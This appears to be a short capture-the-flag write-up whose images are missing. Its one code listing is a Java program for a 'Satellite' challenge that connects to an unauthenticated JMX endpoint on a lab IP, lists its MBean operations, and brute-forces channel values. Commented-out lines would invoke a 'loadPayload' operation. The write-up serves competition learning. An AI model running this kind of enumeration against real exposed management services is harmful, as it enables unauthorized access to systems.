# 2024-CSO-CTF

*[image unavailable]*

*[image unavailable]*

Personal

*[image unavailable]*

Successfully got flag from Reverse challenge

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

The Satellite challenge

*[image unavailable]*

```java
import javax.management.*;
import javax.management.remote.*;
import java.util.*;
import java.io.*;
import java.net.*;

public class JMXConnect {
public static void main(String[] args) throws Exception {
String mbean = "gov.sfb.schriever:type=Galileo";
String hostname = "10.0.2.135";
int port = 1958;
    JMXServiceURL jmxUrl = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + hostname + ":" + port + "/jmxrmi");
    JMXConnector jmxConnector = JMXConnectorFactory.connect(jmxUrl, null);

    try {
        MBeanServerConnection mbs = jmxConnector.getMBeanServerConnection();
        ObjectName mbeanName = new ObjectName(mbean);
        MBeanInfo mbeanInfo = mbs.getMBeanInfo(mbeanName);

        // Print attributes
        System.out.println("Attributes:");
        for (MBeanAttributeInfo attr : mbeanInfo.getAttributes()) {
            String attrName = attr.getName();
            if (attrName.startsWith("channels")) {
                Object attrValue = mbs.getAttribute(mbeanName, attrName);
                System.out.println("\\tName: " + attrName + ", Value: " + attrValue);
            }
        }

    // Print the available operations
    System.out.println("Available Operations:");
    for (MBeanOperationInfo op : mbeanInfo.getOperations()) {
        System.out.println("\\tOperation Name: " + op.getName());
     }

    // Invoke the loadPayload operation
        //System.out.println("Loading payload...");
        //Object[] loadPayloadParams = {0}; // Assuming payload ID is 0
        //String[] loadPayloadSignature = {"int"};
        //mbs.invoke(mbeanName, "loadPayload", loadPayloadParams, loadPayloadSignature);
        //System.out.println("Payload loaded successfully.");

        // Invoke the getChannelValues operation
        //System.out.println("Getting channel values...");
        //Object result = mbs.invoke(mbeanName, "getChannelValues", null, null);
        //System.out.println("Channel values: " + result);

        // Declare totalChannels and totalSubchannels variables
        int totalChannels = 350;
        int totalSubchannels = 260;

        //Iterate over channels and subchannels
        System.out.println("Channel Values:");
        for (int channel = 1; channel <= totalChannels; channel++) {
            for (int subchannel = 1; subchannel <= totalSubchannels; subchannel++) {
                try {
                    Object[] params = {channel, subchannel};
                    String[] signature = {"int", "int"};
                    Object result = mbs.invoke(mbeanName, "getChannelValues", params, signature);
                    System.out.println("Channel " + channel + ", Subchannel " + subchannel + ": " + result);
                } catch (Exception e) {
                    System.err.println("Error invoking getChannelValues for Channel " + channel + ", Subchannel " + subchannel + ": " + e.getMessage());
                    e.printStackTrace();
                }
            }
        }

    } finally {
        jmxConnector.close();
    }
}
}
```
